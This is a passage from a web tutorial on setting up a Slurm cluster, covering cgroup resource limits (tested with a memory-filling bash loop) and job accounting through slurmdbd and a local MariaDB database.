style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%i %P %u %T %M %l %D %C %m %R %Z %N"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">column</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="critical-resource-limiting-with-cgroups">Critical: Resource Limiting with cgroups<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#critical-resource-limiting-with-cgroups" class="hash-link" aria-label="Direct link to Critical: Resource Limiting with cgroups" title="Direct link to Critical: Resource Limiting with cgroups" translate="no">​</a></h3>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><p><strong>This is a critical step that's often overlooked!</strong></p><p>Without proper cgroup configuration, jobs can exceed their allocated resources, potentially causing system instability or crashes. The job scheduler will accept resource limits, but won't actually enforce them.</p></div></div>
<p>Let's test this problem first. Submit a job requesting 500MB and try to allocate much more:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--mem</span><span class="token plain"> 500MB </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--pty</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Try to allocate 1GB of memory (exceeding the 500MB limit)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">declare</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"> mem</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">while</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    mem</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$i</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">head</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> 100M </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token variable" style="color:hsl(221, 87%, 60%)">/dev/zero </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">tr</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'\000'</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'x'</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">((</span><span class="token variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">++</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Allocated: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$((</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">i </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable number" style="color:hsl(35, 99%, 36%)">100</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">))</span><span class="token string" style="color:hsl(119, 34%, 47%)"> MB"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<p>Before submitting the job, memory usage is less than 200MB:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Memory before stress" src="https://riverxdata.github.io/river-docs/assets/images/memory_before_stress-3a4b03c93c2340876dc5a870fe15d2e7.png" width="2432" height="434" class="img_ev3q"></p></figure>
<p>After allocating 1GB, the job is not killed due to missing control group (cgroup) configuration:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Over resource limit" src="https://riverxdata.github.io/river-docs/assets/images/overresource_limit-4d711b28cf5adccae532ca1c9aa28286.png" width="2432" height="434" class="img_ev3q"></p></figure>
<p>You'll notice the job continues running even after exceeding 500MB - that's the problem!</p>
<p>Now let's fix it with cgroups:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> cgroup.conf</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">CgroupAutomount=yes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">CgroupMountpoint=/sys/fs/cgroup</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">ConstrainCores=yes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">ConstrainRAMSpace=yes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">ConstrainDevices=yes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">ConstrainSwapSpace=yes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">MaxSwapPercent=5</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">MemorySwappiness=0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">mv</span><span class="token plain"> cgroup.conf /etc/slurm-llnl/cgroup.conf</span><br></span></code></pre></div></div>
<p>Update <code>slurm.conf</code> to use cgroup plugins:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"s|ProctrackType=proctrack/linuxproc|ProctrackType=proctrack/cgroup|"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"s|TaskPlugin=task/none|TaskPlugin=task/cgroup|"</span><span class="token plain"> /etc/slurm-llnl/slurm.conf</span><br></span></code></pre></div></div>
<p>Enable cgroup in GRUB and reboot:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'s/^GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="cgroup_enable=memory swapaccount=1 /'</span><span class="token plain"> /etc/default/grub</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">update-grub</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">reboot</span><br></span></code></pre></div></div>
<p>After reboot, restart Slurm services:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> slurmctld restart</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> slurmd restart</span><br></span></code></pre></div></div>
<p>Now test again with the same memory allocation script - this time, the job will be killed when it exceeds the limit!</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Out of Memory" src="https://riverxdata.github.io/river-docs/assets/images/oom-06f78a37e67a2fb7a3547efffd709e59.png" width="1305" height="434" class="img_ev3q"></p></figure>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="enabling-accounting">Enabling Accounting<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#enabling-accounting" class="hash-link" aria-label="Direct link to Enabling Accounting" title="Direct link to Enabling Accounting" translate="no">​</a></h3>
<p>Job accounting is essential for:</p>
<ul>
<li class="">Tracking who is using resources</li>
<li class="">Monitoring job completion and failures</li>
<li class="">Enforcing resource limits per user/group</li>
<li class="">Fair-share scheduling</li>
</ul>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Accounting disabled" src="https://riverxdata.github.io/river-docs/assets/images/sacct_disable-3536da7262517e12af0bb6c732d8d3ea.png" width="1310" height="351" class="img_ev3q"></p></figure>
<p>Install the required packages:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> slurmdbd mariadb-server </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-y</span><br></span></code></pre></div></div>
<p>Create the database and user:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> mysql start</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"CREATE DATABASE slurm_acct_db;"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"CREATE USER 'slurm'@'localhost' IDENTIFIED BY 'slurm';"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"GRANT ALL PRIVILEGES ON slurm_acct_db.* TO 'slurm'@'localhost';"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"FLUSH PRIVILEGES;"</span><br></span></code></pre></div></div>
<p>Verify the database was created:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"SHOW DATABASES;"</span><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"SELECT User, Host FROM mysql.user;"</span><br></span></code></pre></div></div>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Add database" src="https://riverxdata.github.io/river-docs/assets/images/add_db-12d303160989d2beda2434df173597ee.png" width="1314" height="539" class="img_ev3q"></p></figure>
<p>Configure <code>slurmdbd</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> slurmdbd.conf</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">PidFile=/run/slurmdbd.pid</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">LogFile=/var/log/slurm/slurmdbd.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">DebugLevel=error</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">DbdHost=localhost</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">DbdPort=6819</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># DB connection data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">StorageType=accounting_storage/mysql</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">StorageHost=localhost</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">StoragePort=3306</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">StorageUser=slurm</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">StoragePass=slurm</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">StorageLoc=slurm_acct_db</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmUser=slurm</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">mv</span><span class="token plain"> slurmdbd.conf /etc/slurm-llnl/slurmdbd.conf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> slurmdbd start</span><br></span></code></pre></div></div>
<p>Update <code>slurm.conf</code> to enable accounting:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"s|AccountingStorageType=accounting_storage/none|AccountingStorageType=accounting_storage/slurmdbd</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\n</span><span class="token string" style="color:hsl(119, 34%, 47%)">AccountingStorageEnforce=associations,limits,qos</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\n</span><span class="token string" style="color:hsl(119, 34%, 47%)">AccountingStorageHost=localhost</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\n</span><span class="token string" style="color:hsl(119, 34%, 47%)">AccountingStoragePort=6819|"</span><span class="token plain"> /etc/slurm-llnl/slurm.conf </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"s|JobAcctGatherType=jobacct_gather/none|JobAcctGatherType=jobacct_gather/cgroup|"</span><span class="token plain"> /etc/slurm-llnl/slurm.conf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl restart slurmctld slurmd</span><br></span></code></pre></div></div>
<p>Add your cluster and user to accounting:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add cluster</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> sacctmgr </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> cluster localcluster</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add account for your user</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> sacctmgr </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> account </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Cluster</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">localcluster</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add your user to the account</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> sacctmgr </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> user </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">account</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">DefaultAccount</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl restart slurmctld slurmd</span><br></span></code></pre></div></div>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Add account" src="https://riverxdata.github.io/river-docs/assets/images/add_account-29ee0d7948684467ad5ebbaf8ac1b09c.png" width="1327" height="511" class="img_ev3q"></p></figure>
<p>Now test accounting by submitting a job and viewing its details:</p>
